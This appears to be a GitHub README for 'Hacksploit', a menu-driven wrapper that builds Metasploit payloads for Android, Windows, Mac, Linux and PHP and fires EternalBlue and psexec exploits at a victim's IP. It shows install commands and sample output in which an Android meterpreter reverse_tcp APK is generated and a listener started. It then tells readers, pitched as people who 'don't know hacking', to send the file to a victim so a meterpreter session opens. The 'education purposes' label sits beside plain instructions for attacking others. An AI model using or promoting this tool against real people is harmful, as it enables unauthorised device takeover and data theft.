# Hacksploit Version 3.1
A tool makes the Metasploit Payloads Easier and faster
Contains 8 payloads. Very Faster and Easier than ever. This will also save the time

{Version 3.1 has only 9 payloads but some are different payloads}
The PAYLOADS are:
```
1] Android Payload | 5] Windows 7 Hunting with IP (SMB=ms08_netapi)  | 9] HTA Exploit Windows with Link
                   |                                                 |  
2] Windows Payload | 6] PHP Payload                                  |
                   |                                                 |
3] Mac Payload     | 7] Remote Desktop (ms17_010_eternalblue)        |
                   |                                                 |
4] Linux Paylaod   | 8] Exploit Windows ONLY by IP (ms17_010_psexec) | <--Vista/XP/2000/2003
```


# Install-Hacksploit
```
git clone https://github.com/Pentesting-Lab/Hacksploit.git
```
```
cd Hacksploit
```
  
# ReadThis
This is only for education purposes. This can be useful for those who don't know hacking. They just wanted to give their IP and Payload Name and for  Remote Desktop (ms17_010_eternalblue) and Exploit Windows Vista/XP/2000/2003 ONLY by IP(ms17_010_psexec) needs Victims ip. After giving  those things easily you can hack. So it is very fast and easier and also makes the work easier. Even installer is also available. You can run it and install Hacksploit in your linux computer. Then you don't need to give cd Hacksploit. Just you can type hacksploit anywhere in your terminal. Then hacksploit wil start to run.

# What wiil the output be
~~~
    ╦ ╦┌─┐┌─┐┬┌─┌─┐┌─┐┬  ┌─┐┬┌┬┐  (Version:3.1)
    ╠═╣├─┤│  ├┴┐└─┐├─┘│  │ ││ │   (Linux)
    ╩ ╩┴ ┴└─┘┴ ┴└─┘┴  ┴─┘└─┘┴ ┴   (By Pratik(My Github account: Pentesting-Lab))




1] Android Payload | 5] Windows 7 Hunting with IP (SMB=ms08_netapi)  | 9] HTA Exploit Windows with Link
                   |                                                 |  
2] Windows Payload | 6] PHP Payload                                  |
                   |                                                 |
3] Mac Payload     | 7] Remote Desktop (ms17_010_eternalblue)        |
                   |                                                 |
4] Linux Paylaod   | 8] Exploit Windows ONLY by IP (ms17_010_psexec) | <--Vista/XP/2000/2003



Select option : 
~~~
Now select one of the option from the menu. For example I will select option 1
~~~
    ╦ ╦┌─┐┌─┐┬┌─┌─┐┌─┐┬  ┌─┐┬┌┬┐  (Version:3.1)
    ╠═╣├─┤│  ├┴┐└─┐├─┘│  │ ││ │   (Linux)
    ╩ ╩┴ ┴└─┘┴ ┴└─┘┴  ┴─┘└─┘┴ ┴   (By Pratik(My Github account: Pentesting-Lab))




1] Android Payload | 5] Windows 7 Hunting with IP (SMB=ms08_netapi)  | 9] HTA Exploit Windows with Link
                   |                                                 |  
2] Windows Payload | 6] PHP Payload                                  |
                   |                                                 |
3] Mac Payload     | 7] Remote Desktop (ms17_010_eternalblue)        |
                   |                                                 |
4] Linux Paylaod   | 8] Exploit Windows ONLY by IP (ms17_010_psexec) | <--Vista/XP/2000/2003



Select option : 1
Application Name: Pentesting-Lab    
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 10181 bytes
Payload location is /root/Desktop/Pentesting-Lab.apk

[-] ***
[-] * WARNING: No database support: No database YAML file
[-] ***
payload => android/meterpreter/reverse_tcp
lhost => 192.168.29.81
lport => 4444
[*] Started reverse TCP handler on 192.168.29.81:4444 
~~~
So this will save the payload in Desktop. It will also show.
~~~
Payload location is /root/Desktop/Pentesting-Lab.apk
~~~
After you should send the payload to victim he will be hacked. Meterpreter session willwe opened
~~~
meterpreter>
~~~
So now you can type help for more commands
